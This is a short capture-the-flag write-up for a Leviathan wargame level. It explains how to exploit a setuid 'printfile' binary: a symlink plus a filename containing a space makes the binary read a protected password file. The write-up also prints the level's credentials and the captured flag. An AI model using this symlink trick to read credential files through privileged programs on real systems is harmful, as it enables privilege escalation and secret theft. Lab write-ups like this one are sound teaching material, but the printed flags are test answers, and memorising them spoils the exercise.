# Level: LeviathanTwo
## Level Credentials: leviathan2:ougahZi8Ta
## Level Description: *none*

### Steps: 
Using `ls` shows a file called *printfile*, which is another 32-bit executable    
Executing it with `./printfile` shows it's usage:  
> Usage: ./printfile filename  

Using `mkdir /tmp/mili101 && echo 'yeet' > /tmp/mili101/test.txt` to create a file, then `ltrace ./printfile /tmp/mili101/test.txt` to run the executable shows some interesting. The program calls cat on whatever is provided, but doesnt use euid to verify. It also has some weird behavior with spaces in filenames.  

`touch yeet\ hmm` to create a file with spaces in the name. Then, we create a symbolic link to the file we want to call `cat` on (the leviathan3 password): `ln -s /etc/leviathan_pass/leviathan3 /tmp/mili101/yeet`  
Notice that I stopped before the space. This is because of the program's behavior towards spaces- it just stops reading the filepath after them.  
### Solution:
`~/printfile /tmp/mili101/yeet\ hmm` will call *printfile*, but it will execute `cat` on the symbolic link *yeet* and not the file *hmm*  


**Flag: Ahdiemoo1j**
